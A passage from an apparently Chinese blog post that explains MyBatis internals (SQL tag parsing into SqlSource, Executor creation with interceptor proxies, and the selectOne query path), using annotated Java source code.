<span class="type">String</span> <span class="variable">resultType</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;resultType&quot;</span>);</span><br><span class="line">   <span class="comment">// 解析resultType的类型</span></span><br><span class="line">   Class&lt;?&gt; resultTypeClass = resolveClass(resultType);、</span><br><span class="line">   <span class="comment">// 解析resultMap，结果集映射</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">resultMap</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;resultMap&quot;</span>);</span><br><span class="line">   <span class="type">String</span> <span class="variable">resultSetType</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;resultSetType&quot;</span>);</span><br><span class="line">   <span class="type">ResultSetType</span> <span class="variable">resultSetTypeEnum</span> <span class="operator">=</span> resolveResultSetType(resultSetType);</span><br><span class="line">   <span class="keyword">if</span> (resultSetTypeEnum == <span class="literal">null</span>) &#123;</span><br><span class="line">     resultSetTypeEnum = configuration.getDefaultResultSetType();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 解析keyProperty和keyColumn属性，仅适用于insert和update语句</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">keyProperty</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;keyProperty&quot;</span>);</span><br><span class="line">   <span class="type">String</span> <span class="variable">keyColumn</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;keyColumn&quot;</span>);</span><br><span class="line">   <span class="type">String</span> <span class="variable">resultSets</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;resultSets&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 最后通过MapperBuilderAssistant的addMappedStatement方法</span></span><br><span class="line">   <span class="comment">// 将insert|delete|update|select节点构建成mappedStatment对象</span></span><br><span class="line">   builderAssistant.addMappedStatement(id, sqlSource, statementType, sqlCommandType,</span><br><span class="line">       fetchSize, timeout, parameterMap, parameterTypeClass, resultMap, resultTypeClass,</span><br><span class="line">       resultSetTypeEnum, flushCache, useCache, resultOrdered,</span><br><span class="line">       keyGenerator, keyProperty, keyColumn, databaseId, langDriver, resultSets);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>浏览完上述的代码，我们着重去看如何把sql语句解析成<strong>SqlSource</strong>对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SqlSource</span> <span class="variable">sqlSource</span> <span class="operator">=</span> </span><br><span class="line">    langDriver.createSqlSource(configuration, context, parameterTypeClass);</span><br></pre></td></tr></table></figure>

<p>我们去看对应的<code>XMLLanguageDriver</code>的<code>createSqlSource</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 方法实现说明:创建我们的sqlSource对象</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@author</span>:xsls</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> configuration:全局配置</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> script:脚本类型</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> parameterType:参数类型</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span>:</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@exception</span>:</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@date</span>:2019/9/6 16:10</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> SqlSource <span class="title function_">createSqlSource</span><span class="params">(Configuration configuration, XNode script, Class&lt;?&gt; parameterType)</span> &#123;</span><br><span class="line">   <span class="type">XMLScriptBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLScriptBuilder</span>(configuration, script, parameterType);</span><br><span class="line">     <span class="comment">//使用XMLScriptBuilder的parseScriptNode()</span></span><br><span class="line">   <span class="keyword">return</span> builder.parseScriptNode();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> SqlSource <span class="title function_">parseScriptNode</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 这里会将sql标签解析成一个SqlSource对象，如果是动态Sql就对应DynamicSqlSource。</span></span><br><span class="line"><span class="comment">    * SqlSource中的成员变量rootSqlNode就是sql解析出来的的根节点。</span></span><br><span class="line"><span class="comment">    * 比如我们映射配置文件案例中的sql就是动态sql，通过【递归】的方式会被解析为若干个SqlNode节点：</span></span><br><span class="line"><span class="comment">    * - MixedSqlNode对应&lt;SELECT&gt;（根节点）</span></span><br><span class="line"><span class="comment">    *   - StaticTextSqlNode对应Sql语句（二级节点）</span></span><br><span class="line"><span class="comment">    *   - WhereSqlNode对应&lt;WHERE&gt;（二级节点）</span></span><br><span class="line"><span class="comment">    *     - IfSqlNode对应&lt;IF&gt;（三级节点）</span></span><br><span class="line"><span class="comment">    *       - StaticTextSqlNode对应Sql语句（四级节点）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="type">MixedSqlNode</span> <span class="variable">rootSqlNode</span> <span class="operator">=</span> parseDynamicTags(context);</span><br><span class="line">   SqlSource sqlSource;</span><br><span class="line">   <span class="comment">//判断是否为动态SQL</span></span><br><span class="line">   <span class="keyword">if</span> (isDynamic) &#123;</span><br><span class="line">     <span class="comment">// 动态Sql源</span></span><br><span class="line">     <span class="comment">// 把刚刚的MixedSqlNode变为DynamicSqlSource，下面类似	</span></span><br><span class="line">     sqlSource = <span class="keyword">new</span> <span class="title class_">DynamicSqlSource</span>(configuration, rootSqlNode);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">// 静态Sql源， 它会在这里解析</span></span><br><span class="line">     sqlSource = <span class="keyword">new</span> <span class="title class_">RawSqlSource</span>(configuration, rootSqlNode, parameterType);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> sqlSource;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 解析标签</span></span><br><span class="line"> <span class="keyword">protected</span> MixedSqlNode <span class="title function_">parseDynamicTags</span><span class="params">(XNode node)</span> &#123;</span><br><span class="line">   List&lt;SqlNode&gt; contents = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">   <span class="comment">// 获得Sql语句标签(比如&lt;SELECT&gt;)的子节点  </span></span><br><span class="line">   <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> node.getNode().getChildNodes();  </span><br><span class="line">   <span class="comment">// 遍历子节点</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; children.getLength(); i++) &#123;</span><br><span class="line">     <span class="type">XNode</span> <span class="variable">child</span> <span class="operator">=</span> node.newXNode(children.item(i));</span><br><span class="line">     <span class="comment">// 如果是文本节点，比如sql语句和空行都是文本节点</span></span><br><span class="line">     <span class="keyword">if</span> (child.getNode().getNodeType() == Node.CDATA_SECTION_NODE || child.getNode().getNodeType() == Node.TEXT_NODE) &#123;</span><br><span class="line">       <span class="comment">// 获得sql文本  </span></span><br><span class="line">       <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> child.getStringBody(<span class="string">&quot;&quot;</span>); </span><br><span class="line">       <span class="comment">// 将sql文本封装为TextSqlNode</span></span><br><span class="line">       <span class="type">TextSqlNode</span> <span class="variable">textSqlNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextSqlNode</span>(data);</span><br><span class="line">       <span class="comment">// 如果sql文本中有$&#123;&#125;，就是算Dynamic</span></span><br><span class="line">       <span class="keyword">if</span> (textSqlNode.isDynamic()) &#123; </span><br><span class="line">         contents.add(textSqlNode);</span><br><span class="line">         <span class="comment">//这里设定为动态SQL</span></span><br><span class="line">         isDynamic = <span class="literal">true</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         contents.add(<span class="keyword">new</span> <span class="title class_">StaticTextSqlNode</span>(data));</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="comment">// 如果不是文本节点，比如&lt;where&gt;&lt;if&gt;&lt;trim&gt;等动态节点</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child.getNode().getNodeType() == Node.ELEMENT_NODE) &#123; <span class="comment">// issue #628</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNode().getNodeName();</span><br><span class="line">       <span class="comment">// 拿到一个NodeHandler节点处理器</span></span><br><span class="line">       <span class="type">NodeHandler</span> <span class="variable">handler</span> <span class="operator">=</span> nodeHandlerMap.get(nodeName);</span><br><span class="line">       <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Unknown element &lt;&quot;</span> + nodeName + <span class="string">&quot;&gt; in SQL statement.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 通过节点处理器解析动态节点，不同的节点有不同的处理器</span></span><br><span class="line">       <span class="comment">// 比如：WhereHandler、IfHandler、TrimHandler等等</span></span><br><span class="line">       <span class="comment">// 这里会进行【递归】解析，将所有的节点都解析出来</span></span><br><span class="line">       handler.handleNode(child, contents); </span><br><span class="line">       <span class="comment">// 如果有这种动态节点，那说明是动态sql</span></span><br><span class="line">       isDynamic = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MixedSqlNode</span>(contents);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">WhereHandler</span> <span class="keyword">implements</span> <span class="title class_">NodeHandler</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">WhereHandler</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="comment">// Prevent Synthetic Access</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//handler.handleNode(child, contents);</span></span><br><span class="line">   <span class="comment">//这里调用这个完成解析where</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNode</span><span class="params">(XNode nodeToHandle, List&lt;SqlNode&gt; targetContents)</span> &#123;</span><br><span class="line">     <span class="comment">//又是解析标签的调用</span></span><br><span class="line">     <span class="comment">//如果又遇到非文本节点 就继续递归</span></span><br><span class="line">     <span class="type">MixedSqlNode</span> <span class="variable">mixedSqlNode</span> <span class="operator">=</span> parseDynamicTags(nodeToHandle);</span><br><span class="line">     <span class="type">WhereSqlNode</span> <span class="variable">where</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WhereSqlNode</span>(configuration, mixedSqlNode);</span><br><span class="line">     targetContents.add(where);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>到这里Sql语句标签就解析完成了，我们简单总结一下Sql语句的解析过程：</p>
<ol>
<li>通过XMLStatementBuilder类的<code>parseStatementNode</code>方法解析Sql语句标签，包含若干属性和Sql语句。</li>
<li>通过XMLScriptBuilder类的<code>parseScriptNode</code>方法，通过递归的方式将Sql语句解析成若干个<strong>SqlNode</strong>节点，并且封装至<strong>SqlSource</strong>对象中。</li>
<li>最后将所有属性和Sql语句对应的SqlSource对象封装成<strong>MappedStatement</strong>对象，保存至Configuration的一个Map中，<code>key</code>就是Sql语句所属方法的全限定名。</li>
</ol>
<h2 id="SQL执行流程"><a href="#SQL执行流程" class="headerlink" title="SQL执行流程"></a>SQL执行流程</h2><p>我们使用生成器模式完成了<code>SqlSessionFactory</code>的构建，现在我们可以看后续的操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> sqlMapper.openSession();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 执行查询 底层执行jdbc</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)session.selectOne(<span class="string">&quot;com.tuling.mapper.UserMapper.selectById&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*UserMapper mapper = session.getMapper(UserMapper.class);</span></span><br><span class="line"><span class="comment">                System.out.println(mapper.getClass());</span></span><br><span class="line"><span class="comment">                User user = mapper.selectById(1L);*/</span></span><br><span class="line">    session.commit();</span><br><span class="line">    System.out.println(user.getUserName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到到SqlSessionFactory的实现类DefaultSqlSessionFactory的<code>openSession</code>方法中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SqlSession <span class="title function_">openSession</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> openSessionFromDataSource(configuration.getDefaultExecutorType(), <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 方法实现说明:从session中开启一个数据源</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@author</span>:xsls</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> execType:执行器类型</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> level:隔离级别</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span>:SqlSession</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@exception</span>:</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@date</span>:2019/9/9 13:38</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> SqlSession <span class="title function_">openSessionFromDataSource</span><span class="params">(ExecutorType execType, TransactionIsolationLevel level, <span class="type">boolean</span> autoCommit)</span> &#123;</span><br><span class="line">    <span class="type">Transaction</span> <span class="variable">tx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 获取环境变量</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">Environment</span> <span class="variable">environment</span> <span class="operator">=</span> configuration.getEnvironment();</span><br><span class="line">      <span class="comment">// 获取事务工厂</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">TransactionFactory</span> <span class="variable">transactionFactory</span> <span class="operator">=</span> getTransactionFactoryFromEnvironment(environment);</span><br><span class="line">      tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit);</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 创建一个sql执行器【Executor对象】，这是一个核心对象</span></span><br><span class="line"><span class="comment">       * 一般情况下若的mybaits的全局配置文件的cacheEnabled为ture（开启二级缓存）</span></span><br><span class="line"><span class="comment">       * 就返回一个CachingExecutor,若关闭的话返回的就是一个SimpleExecutor</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> configuration.newExecutor(tx, execType);</span><br><span class="line">      <span class="comment">//创建返回一个DeaultSqlSessoin对象返回</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultSqlSession</span>(configuration, executor, autoCommit);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      closeTransaction(tx); <span class="comment">// may have fetched a connection so lets call close()</span></span><br><span class="line">      <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">&quot;Error opening session.  Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      ErrorContext.instance().reset();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;          </span><br></pre></td></tr></table></figure>

<h3 id="创建Executor"><a href="#创建Executor" class="headerlink" title="创建Executor"></a>创建Executor</h3><p>上述代码中创建了一个Mybatis中的一大核心对象<strong>Executor</strong>。</p>
<p>Mybatis中有三种基本的Executor执行器的实现，<strong>SimpleExecutor</strong>、<strong>ReuseExecutor</strong>和<strong>BatchExecutor</strong>。</p>
<p>此外还有两种执行器CachingExecutor【二级缓存】、BaseExecutor【一级缓存】</p>
<p>这两者执行器实际上都是委托三个基本的执行器去执行的</p>
<p>可通过全局配置文件中的<code>defaultExecutorType</code>属性进行设置，默认值为<code>SIMPLE</code>。</p>
<ul>
<li>SimpleExecutor：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。</li>
<li>ReuseExecutor：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map内，供下一次使用。简言之，就是重复使用Statement对象。</li>
<li>BatchExecutor：执行update时（JDBC批处理不支持select），将所有sql都通过<code>addBatch</code>添加到批处理中，等待统一执行<code>executeBatch</code>，它缓存了多个Statement对象，每个Statement对象都是添加完毕后，等待逐一执行批处理。</li>
</ul>
<p>Executor的这些特点，都严格限制在SqlSession生命周期范围内。接着到Configuration类的<code>newExecutor</code>方法中分析一下Executor的创建过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Executor <span class="title function_">newExecutor</span><span class="params">(Transaction transaction, ExecutorType executorType)</span> &#123;</span><br><span class="line">    <span class="comment">// 默认为SimpleExecutor</span></span><br><span class="line">    executorType = executorType == <span class="literal">null</span> ? defaultExecutorType : executorType;</span><br><span class="line">    executorType = executorType == <span class="literal">null</span> ? ExecutorType.SIMPLE : executorType;</span><br><span class="line">    Executor executor;</span><br><span class="line">    <span class="comment">// 判断执行器的类型</span></span><br><span class="line">    <span class="comment">// 批量执行器BatchExecutor</span></span><br><span class="line">    <span class="keyword">if</span> (ExecutorType.BATCH == executorType) &#123;</span><br><span class="line">        executor = <span class="keyword">new</span> <span class="title class_">BatchExecutor</span>(<span class="built_in">this</span>, transaction);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ExecutorType.REUSE == executorType) &#123;</span><br><span class="line">        <span class="comment">//可重复使用的执行器</span></span><br><span class="line">        executor = <span class="keyword">new</span> <span class="title class_">ReuseExecutor</span>(<span class="built_in">this</span>, transaction);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//简单的sql执行器对象</span></span><br><span class="line">        executor = <span class="keyword">new</span> <span class="title class_">SimpleExecutor</span>(<span class="built_in">this</span>, transaction);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断mybatis的全局配置文件是否开启缓存</span></span><br><span class="line">    <span class="keyword">if</span> (cacheEnabled) &#123;</span><br><span class="line">        <span class="comment">//把当前的简单的执行器包装成一个CachingExecutor</span></span><br><span class="line">        <span class="comment">//装饰器模式</span></span><br><span class="line">        executor = <span class="keyword">new</span> <span class="title class_">CachingExecutor</span>(executor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用InterceptorChain的pluginAll方法</span></span><br><span class="line">    <span class="comment">// 会调用所有拦截器对象的plugin方法，这里会将Executor进行动态代理</span></span><br><span class="line">    executor = (Executor) interceptorChain.pluginAll(executor);</span><br><span class="line">    <span class="keyword">return</span> executor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里传入的target是Executor</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">pluginAll</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">  <span class="comment">// 之前解析配置文件时将所有的plugin解析为Interceptor</span></span><br><span class="line">  <span class="comment">// 这里遍历所有的Interceptor  </span></span><br><span class="line">  <span class="keyword">for</span> (Interceptor interceptor : interceptors) &#123;</span><br><span class="line">    <span class="comment">// 调用Interceptor的plugin方法</span></span><br><span class="line">    <span class="comment">// 可能返回一个代理对象</span></span><br><span class="line">    <span class="comment">// 由于可能会存在多个插件，所以这里会形成代理中套代理的情况</span></span><br><span class="line">    target = interceptor.plugin(target);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义插件类实现Interceptor接口的plugin方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">plugin</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">    <span class="comment">// 接口中默认的实现是调用Plugin的wrap方法</span></span><br><span class="line">    <span class="comment">// 这里基本不会修改，按照默认的即可</span></span><br><span class="line">    <span class="keyword">return</span> Plugin.wrap(target, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 参数target是Executor对象，interceptor是自定义插件对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">wrap</span><span class="params">(Object target, Interceptor interceptor)</span> &#123;</span><br><span class="line">    <span class="comment">// 获得interceptor配置的@Signature的type</span></span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;Method&gt;&gt; signatureMap = getSignatureMap(interceptor);</span><br><span class="line">    <span class="comment">// 当前代理类型 为Execcutor的子类</span></span><br><span class="line">    Class&lt;?&gt; type = target.getClass();</span><br><span class="line">    <span class="comment">// 根据当前target的类型和@signature中指定的type进行配对</span></span><br><span class="line">    <span class="comment">// 如果配对成功则可以进行动态代理</span></span><br><span class="line">    Class&lt;?&gt;[] interfaces = getAllInterfaces(type, signatureMap);</span><br><span class="line">    <span class="comment">//匹配成功</span></span><br><span class="line">    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">            type.getClassLoader(),</span><br><span class="line">            interfaces,</span><br><span class="line">            <span class="comment">// invocationHandler传入的是一个Plugin对象</span></span><br><span class="line">            <span class="comment">// 说明调用代理对象时执行的invoke方法就在Plugin类中实现</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Plugin</span>(target, interceptor, signatureMap));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有匹配上，那就返回原target对象</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里，Executor对象就创建完了，最后将其设置到<code>DefaultSqlSession</code>对象中并返回。</p>
<p> <strong>简单总结</strong></p>
<ul>
<li>拿到SqlSessionFactory对象后，会调用SqlSessionFactory的openSesison方法，这个方法会创建一个Sql执行器（Executor），这个Sql执行器会代理你配置的拦截器方法。</li>
<li>获得上面的Sql执行器后，会创建一个SqlSession（默认使用DefaultSqlSession）,这个SqlSession中也包含了Configration对象，所以通过SqlSession也能拿到全局配置；</li>
<li>获得SqlSession对象后就能执行各种CRUD方法了。</li>
</ul>
<h3 id="执行Sql"><a href="#执行Sql" class="headerlink" title="执行Sql"></a>执行Sql</h3><p>我们就拿案例中的<code>selectOne</code>为例，分析执行Sql的流程。找到DefaultSqlSession的<code>selectOne</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 方法实现说明:查询我们当个对象</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@author</span>:xsls</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> statement:我们的statementId(com.tuling.mapper.EmployeeMapper.findOne)</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> parameter:调用时候的参数</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span>: T 返回结果</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@exception</span>:</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@date</span>:2019/9/9 20:26</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">selectOne</span><span class="params">(String statement, Object parameter)</span> &#123;</span><br><span class="line"><span class="comment">// 调用的selectList</span></span><br><span class="line">   List&lt;T&gt; list = <span class="built_in">this</span>.selectList(statement, parameter);</span><br><span class="line">   <span class="comment">//若查询出来有且有一个一个对象，直接返回要给</span></span><br><span class="line">   <span class="keyword">if</span> (list.size() == <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> list.get(<span class="number">0</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (list.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="comment">//查询多个 抛出异常</span></span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TooManyResultsException</span>(<span class="string">&quot;Expected one result (or null) to be returned by selectOne(), but found: &quot;</span> + list.size());</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">selectList</span><span class="params">(String statement, Object parameter)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">this</span>.selectList(statement, parameter, RowBounds.DEFAULT);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">selectList</span><span class="params">(String statement, Object parameter, RowBounds rowBounds)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="comment">//通过我们的statement去我们的全局配置类中获取MappedStatement</span></span><br><span class="line">     <span class="type">MappedStatement</span> <span class="variable">ms</span> <span class="operator">=</span> configuration.getMappedStatement(statement);</span><br><span class="line">      <span class="comment">// 通过执行器Executor去执行sql对象MappedStatement</span></span><br><span class="line">      <span class="comment">// 首先通过wrapCollection方法包装参数</span></span><br><span class="line">      <span class="comment">// 在二级缓存默认开启的情况下调用的是CachingExecutor的query方法</span></span><br><span class="line">     <span class="keyword">return</span> executor.query(ms, wrapCollection(parameter), rowBounds, Executor.NO_RESULT_HANDLER);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">&quot;Error querying database.  Cause: &quot;</span> + e, e);</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">     ErrorContext.instance().reset();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Object <span class="title function_">wrapCollection</span><span class="params">(<span class="keyword">final</span> Object object)</span> &#123;</span><br><span class="line">   <span class="comment">//若我们的参数类型是Collection</span></span><br><span class="line">   <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Collection) &#123;</span><br><span class="line">     StrictMap&lt;Object&gt; map = <span class="keyword">new</span> <span class="title class_">StrictMap</span>&lt;&gt;();</span><br><span class="line">     <span class="comment">//把他key为collection存放到map中</span></span><br><span class="line">     map.put(<span class="string">&quot;collection&quot;</span>, object);</span><br><span class="line">     <span class="comment">//若我们参数类型是list类型  把key为list作为集合存放到map中</span></span><br><span class="line">     <span class="keyword">if</span> (object <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">       map.put(<span class="string">&quot;list&quot;</span>, object);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> map;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; object.getClass().isArray()) &#123;</span><br><span class="line">     <span class="comment">//若是数组，存放key为array的map中</span></span><br><span class="line">     StrictMap&lt;Object&gt; map = <span class="keyword">new</span> <span class="title class_">StrictMap</span>&lt;&gt;();</span><br><span class="line">     map.put(<span class="string">&quot;array&quot;</span>, object);</span><br><span class="line">     <span class="keyword">return</span> map;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们跟进CachingExecutor的<code>query</code>方法：</p>
<blockquote>
<p>注意：如果有拦截器匹配的话，这里的CachingExecutor就是代理对象，那么首先会执行拦截器中的<code>intercept</code>方法。后续还有三个对象StatementHandler、ResultSetHandler和ParameterHandler也是同样的道理。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">// 调用MappedStatement的getBoundSql方法解析Sql语句</span></span><br><span class="line">    <span class="comment">// 因为之前我们将动态Sql解析成一个个SqlNode节点，这里需要根据参数进行拼装</span></span><br><span class="line">    <span class="comment">// 通过SQLNode使用责任链的方式解析SQL</span></span><br><span class="line">    <span class="comment">// 方法中会通过SqlSource对象从根节点开始调用所有SqlNode节点的apply方法</span></span><br><span class="line">    <span class="comment">// 会解析 #&#123;&#125; 和 OGNL 表达式等信息，最后拼装得到一个最终的Sql语句BoundSql</span></span><br><span class="line">    <span class="type">BoundSql</span> <span class="variable">boundSql</span> <span class="operator">=</span> ms.getBoundSql(parameterObject);</span><br><span class="line">    <span class="comment">//缓存的KEY</span></span><br><span class="line">    <span class="type">CacheKey</span> <span class="variable">key</span> <span 